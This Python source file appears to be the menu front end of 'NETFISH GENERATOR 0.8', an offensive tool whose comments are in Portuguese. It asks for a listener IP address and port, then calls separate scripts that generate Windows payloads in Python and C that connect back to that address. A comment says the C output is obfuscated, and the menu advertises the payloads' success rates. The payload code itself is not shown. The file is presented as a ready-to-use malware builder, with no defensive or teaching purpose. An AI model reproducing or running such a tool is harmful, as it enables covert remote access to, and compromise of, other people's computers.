# feito por M1000 - github.com/curious0w
import subprocess
import sys
import platform
import os
import time
import socket
import ipaddress
import psutil  # type: ignore 
import random 
from rich.console import Console # type: ignore
from rich.panel import Panel # type: ignore

console = Console()
from escopos.python.escopo_win import * 
from escopos.C.escopo_c import * 
from draw.desenhos import *


# no momento só é aceito linux -_-
def verification():
    """Verifica o sistema operacional e limpa a tela."""
    if platform.system() == "Windows":
        print("execute apenas no linux!")
        sys.exit() # Alterado para sys.exit() para garantir a saída imediata
    else: # Linux e macOS
        os.system('clear')

#função imports
def imports():
    python_executable = sys.executable 
    
    comand = [
        python_executable, 
        '-m', 
        'pip', 
        'install', 
        '-r', 
        'requirements.txt' 
    ]

# IDENTIFICADOR DE ERRO PIP 
    try:
        print("--- Verificando e Instalando Dependências ---")
        subprocess.run(
            comand, 
            capture_output=True, 
            text=True, 
            check=True 
        )
        print("--- Instalação Concluída ---")

    except FileNotFoundError:
        print("Erro: O executável do Python não foi encontrado no seu sistema.")
        sys.exit()
    except Exception as e:
        print(f"Ocorreu um erro inesperado na instalação: {e}")
        sys.exit()

# --- Funções de IP e Porta ---

def validar_ipv4(ip_string):
    """Verifica se a string é um endereço IPv4 válido."""
    try:
        ipaddress.IPv4Address(ip_string)
        return True
    except ipaddress.AddressValueError:
        return False

def validar_porta(port_string):
    """Verifica se a string é uma porta válida (1 a 65535)."""
    try:
        port = int(port_string)
        return 1 <= port <= 65535
    except ValueError:
        return False

def listar_e_selecionar_ip():
    """Lista as interfaces, IPs e solicita que o usuário selecione um."""
    interfaces_info = {}
    print("\n [IPs de Interfaces de Rede Disponíveis (IPv4)]")
    
    contador = 1
    # Mapear interfaces e IPs
    for nome, addrs in psutil.net_if_addrs().items():
        # Encontra o primeiro IPv4 que não seja loopback
        ip_v4 = next((a.address for a in addrs if a.family == socket.AF_INET and not nome.startswith('lo')), None)
        
        if ip_v4:
            print(f"[{contador}] {nome}: {ip_v4}")
            interfaces_info[contador] = ip_v4
            contador += 1
    
    if not interfaces_info:
        print("Nenhuma interface ativa com IPv4 encontrada.")
        return None

    # Solicitar a escolha
    while True:
        try:
            escolha = input("Digite o **número** do IP que você deseja usar ou digite um IP manualmente: ")
            
            # Se for um número, checa se está na lista de opções
            if escolha.isdigit():
                escolha_num = int(escolha)
                if escolha_num in interfaces_info:
                    ip_selecionado = interfaces_info[escolha_num]
                    print(f"\n IP Selecionado: {ip_selecionado}")
                    return ip_selecionado
                else:
                    print("Número inválido. Escolha um número da lista.")
            
            # Se for uma string (IP manual), valida o formato
            elif validar_ipv4(escolha):
                 print(f"\n IP Manual Selecionado: {escolha}")
                 return escolha
            else:
                 print("Entrada inválida. Não é um número de opção nem um formato IPv4 válido.")

        except ValueError:
            print("Entrada inválida.")
        except Exception as e:
            print(f"Erro inesperado na seleção de IP: {e}")
            break
    return None

# --- Funções Principais do Menu ---

def menu():


    time.sleep(1) # Reduzido o tempo de espera para ser mais rápido
    os.system('clear')
    desenho_escolhido = random.choice([desenho1, desenho2, desenho3, desenho4])

# Exibe usando o Panel do Rich
    console.print(
        Panel(
            desenho_escolhido, 
            title="[bold red]NETFISH GENERATOR 0.8[/bold red]", 
            subtitle="[yellow]github.com/curious0w[/yellow]",
            border_style="bright_blue",
            expand=False
        )
    )

    console.print(
        Panel(
            "[bold blue]-----Payloads-Disponiveis-(Windows)----[/bold blue]\n"
            "[bold green][1]-Python (97% de eficacia!)[/bold green]\n"
            "[bold red][2]-C (65% de eficacia)[/bold red]\n"
            "[bold yellow]mais opções futuramente...:)[/bold yellow]",
            border_style="bright_blue",
            expand=False
        )
    )
    try:
        option = int(input("\nEscolha uma opção:"))
    except ValueError:
        print("Opção inválida. Digite um número.")
        time.sleep(1)
        return
    
    #Python
    if option == 1:
        # 1. Coleta e Seleção do IP
        ip = listar_e_selecionar_ip()
        
        if not ip:
            print("Nenhuma seleção de IP válida foi feita. Retornando ao menu.")
            time.sleep(2)
            return
            
        # 2. Coleta e Valida Porta
        while True:
            port_input = input("Digite a porta que vai receber a conexão (1-65535): ")
            if validar_porta(port_input):
                port = port_input # Mantém como string para passar ao subprocess
                break
            print("Erro: Porta inválida. Digite um número inteiro entre 1 e 65535.")
            
        # 3. Execução Segura (Modificação Final do Payload)
        comando = [
            'python3',
            'escopos/python/escopo_win.py',
            ip, # IP Selecionado/Validado
            port # Porta Validada
        ]
        
        try:
            print(f"\n Gerando payload com IP: {ip} e Porta: {port}...")
            
            # Executa o script. Captura a saída para mostrar ao usuário.
            resultado = subprocess.run(
                comando, 
                check=True, 
                text=True, 
                capture_output=True
            )
            
            print("\n--- Saída do Gerador de Payload ---")
            print(resultado.stdout)
            
            # Pausa para o usuário ver a saída final
            input("Pressione Enter para continuar...") 
            
        except subprocess.CalledProcessError as e:
            print(f"\nERRO na execução do escopo_win.py. Código: {e.returncode}")
            print(f"Stderr: {e.stderr}")
            input("Pressione Enter para continuar...") 
            
    #C
    elif option == 2: 

        ip = listar_e_selecionar_ip()
        
        if not ip:
            print("Nenhuma seleção de IP válida foi feita. Retornando ao menu.")
            time.sleep(2)
            return
        
        while True:
            port_input = input("Digite a porta que vai receber a conexão (1-65535): ")
            if validar_porta(port_input):
                port = port_input # Mantém como string para passar ao subprocess
                break
            print("Erro: Porta inválida. Digite um número inteiro entre 1 e 65535.")

        # Invoca o gerador de payload C que cria e ofusca o arquivo final
        comando = [
            sys.executable,
            'escopos/C/escopo_c.py',
            ip,
            port,
        ]

        try:
            print(f"\n Gerando payload com IP: {ip} e Porta: {port}...")
            
            # Executa o script. Captura a saída para mostrar ao usuário.
            resultado = subprocess.run(
                comando, 
                check=True, 
                text=True, 
                capture_output=True
            )
            
            print("\n--- Saída do Gerador de Payload ---")
            print(resultado.stdout)
            
            # Pausa para o usuário ver a saída final
            input("Pressione Enter para continuar...") 
            
        except subprocess.CalledProcessError as e:
            print(f"\nERRO na execução do escopo_.py. Código: {e.returncode}")
            print(f"Stderr: {e.stderr}")
            input("Pressione Enter para continuar...") 
                        
        
        time.sleep(2)

    # Lógica de loop corrigida
    menu()

# Chamadas iniciais
verification()
imports()
menu()